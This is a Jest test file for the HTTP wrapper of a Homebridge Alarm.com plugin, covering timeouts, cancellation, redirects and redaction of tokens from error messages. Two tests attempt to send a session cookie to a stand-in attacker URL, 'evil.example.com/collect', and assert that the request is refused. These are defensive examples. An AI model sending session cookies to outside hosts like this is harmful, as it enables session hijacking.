/**
 * Copyright (c) 2026 tbaur
 *
 * Licensed under the Apache License, Version 2.0
 * See LICENSE file for full license text
 *
 * Two properties matter here beyond "it fetches": every request has a deadline,
 * and no failure message may carry a query string, because Alarm.com puts the
 * event stream token in one.
 */

import nock from 'nock'
import { httpRequest, USER_AGENT } from '../../../src/api/http'
import {
  AlarmComError,
  NetworkError,
  OperationAbortedError,
  TimeoutError,
} from '../../../src/errors'
import { BASE_URL } from '../../../src/settings'
import { captureRejection } from '../../helpers/errors'

describe('httpRequest', () => {
  it('performs a GET and returns the response', async () => {
    nock(BASE_URL).get('/web/KeepAlive.aspx').reply(200, '{"status":200}')

    const response = await httpRequest(`${BASE_URL}/web/KeepAlive.aspx`)

    expect(response.status).toBe(200)
    expect(response.ok).toBe(true)
    expect(response.text).toBe('{"status":200}')
  })

  it('identifies the plugin honestly rather than impersonating a browser', async () => {
    nock(BASE_URL)
      .matchHeader('user-agent', USER_AGENT)
      .get('/web/KeepAlive.aspx')
      .reply(200, '')

    await expect(httpRequest(`${BASE_URL}/web/KeepAlive.aspx`)).resolves.toMatchObject({ status: 200 })
    expect(USER_AGENT).toMatch(/^homebridge-myalarmcom\//)
  })

  it('sends the caller headers and body', async () => {
    let seenBody = ''
    nock(BASE_URL)
      .matchHeader('content-type', 'application/x-www-form-urlencoded')
      .post('/web/Default.aspx')
      .reply(200, (_uri, body) => {
        seenBody = String(body)
        return ''
      })

    await httpRequest(`${BASE_URL}/web/Default.aspx`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ IsFromNewSite: '1' }),
    })

    expect(seenBody).toBe('IsFromNewSite=1')
  })

  it('does not follow redirects, so login cookies are not discarded', async () => {
    nock(BASE_URL)
      .post('/web/Default.aspx')
      .reply(302, '', { Location: '/web/system/home' })

    const response = await httpRequest(`${BASE_URL}/web/Default.aspx`, { method: 'POST' })

    expect(response.status).toBe(302)
    expect(response.headers.get('location')).toBe('/web/system/home')
  })

  it('abandons a request that outlives its deadline', async () => {
    nock(BASE_URL).get('/web/KeepAlive.aspx').delay(500).reply(200, '')
    const startedAt = Date.now()

    const error = await captureRejection(httpRequest(`${BASE_URL}/web/KeepAlive.aspx`, { timeoutMs: 20 }))

    expect(error).toBeInstanceOf(AlarmComError)
    expect((error as AlarmComError).isRetryable).toBe(true)
    expect(Date.now() - startedAt).toBeLessThan(400)
  })

  it('classifies a request that outran its deadline as a timeout', async () => {
    nock(BASE_URL).get('/web/KeepAlive.aspx').delay(200).reply(200, '')

    const error = await captureRejection(httpRequest(`${BASE_URL}/web/KeepAlive.aspx`, { timeoutMs: 20 }))

    expect(error).toBeInstanceOf(TimeoutError)
    expect(error.message).toBe('Request to https://www.alarm.com/web/KeepAlive.aspx timed out after 20ms')
  })

  /**
   * `fetch` settles as soon as headers arrive. A deadline that stops there
   * leaves a stalled body read with no bound at all, and every caller reads the
   * body — so one hung response used to stop polling for the life of the
   * process with nothing in the log.
   */
  it('holds the deadline over the body, not just the headers', async () => {
    nock(BASE_URL)
      .get('/web/KeepAlive.aspx')
      .delayBody(500)
      .reply(200, 'a slow body')

    const error = await captureRejection(
      httpRequest(`${BASE_URL}/web/KeepAlive.aspx`, { timeoutMs: 40 }),
    )

    expect(error).toBeInstanceOf(TimeoutError)
  })

  describe('cancellation', () => {
    it('refuses a request whose signal has already aborted', async () => {
      const error = await captureRejection(
        httpRequest(`${BASE_URL}/web/KeepAlive.aspx`, { signal: AbortSignal.abort() }),
      )

      expect(error).toBeInstanceOf(OperationAbortedError)
    })

    it('abandons an in-flight request when the caller aborts', async () => {
      nock(BASE_URL).get('/web/KeepAlive.aspx').delay(500).reply(200, '')
      const controller = new AbortController()
      setTimeout(() => controller.abort(), 20)

      const error = await captureRejection(
        httpRequest(`${BASE_URL}/web/KeepAlive.aspx`, { signal: controller.signal }),
      )

      expect(error).toBeInstanceOf(OperationAbortedError)
      expect(error.message).not.toContain('timed out')
    })
  })

  /**
   * Today no URL is server-supplied and redirects are not followed, so this
   * cannot fire. That is the point: the safety is an emergent property of two
   * unrelated decisions, and a change to either should fail loudly rather than
   * quietly replay a live session cookie to another host.
   */
  it('refuses to send session cookies anywhere but Alarm.com', async () => {
    const error = await captureRejection(
      httpRequest('https://evil.example.com/collect', { headers: { Cookie: 'afg=secret' } }),
    )

    expect(error).toBeInstanceOf(NetworkError)
    expect(error.message).toContain('Refusing to send session cookies')
    expect(error.message).not.toContain('secret')
  })

  /**
   * `fetch` normalises header names, so a caller spelling it `cookie` sends the
   * same jar. A case-sensitive property read made the guard silently do nothing
   * for that spelling — worse than no guard, because it reads as covering both.
   */
  it('applies the origin check whatever case the header name is written in', async () => {
    for (const name of ['cookie', 'COOKIE', 'CoOkIe']) {
      const error = await captureRejection(
        httpRequest('https://evil.example.com/collect', { headers: { [name]: 'afg=secret' } }),
      )

      expect(error.message).toContain('Refusing to send session cookies')
    }
  })

  /**
   * A followed redirect replays the request, cookies included, at a location the
   * server chose — and `fetch` offers no hook to re-check each hop. The only
   * honest control is to refuse the combination.
   */
  it('refuses to follow redirects on a request that carries session cookies', async () => {
    const error = await captureRejection(
      httpRequest(`${BASE_URL}/web/api/identities`, {
        headers: { Cookie: 'afg=secret' },
        redirect: 'follow',
      }),
    )

    expect(error).toBeInstanceOf(NetworkError)
    expect(error.message).toContain('Refusing to follow redirects')
    expect(error.message).not.toContain('secret')
  })

  it('raises a NetworkError when the request fails below the HTTP layer', async () => {
    nock(BASE_URL).get('/web/KeepAlive.aspx').replyWithError({ code: 'ECONNREFUSED' })

    await expect(httpRequest(`${BASE_URL}/web/KeepAlive.aspx`)).rejects.toThrow(NetworkError)
  })

  it('keeps the original failure as the cause of a NetworkError', async () => {
    const underlying = new Error('socket hang up')
    jest.spyOn(globalThis, 'fetch').mockRejectedValue(underlying)

    const error = await captureRejection(httpRequest(`${BASE_URL}/web/KeepAlive.aspx`))

    expect(error).toBeInstanceOf(NetworkError)
    expect(error.cause).toBe(underlying)
  })

  it('keeps the query string out of failure messages', async () => {
    const url = `${BASE_URL}/web/api/websockets/token?auth=super-secret-token`
    nock(BASE_URL).get('/web/api/websockets/token').query(true).replyWithError({ code: 'ECONNRESET' })

    const error = await captureRejection(httpRequest(url))

    expect(error.message).toContain('https://www.alarm.com/web/api/websockets/token')
    expect(error.message).not.toContain('super-secret-token')
  })

  it('keeps the query string out of timeout messages too', async () => {
    nock(BASE_URL).get('/web/api/websockets/token').query(true).delay(200).reply(200, '')

    const url = `${BASE_URL}/web/api/websockets/token?auth=super-secret-token`
    const error = await captureRejection(httpRequest(url, { timeoutMs: 20 }))

    expect(error).toBeInstanceOf(TimeoutError)
    expect(error.message).not.toContain('super-secret-token')
  })
})
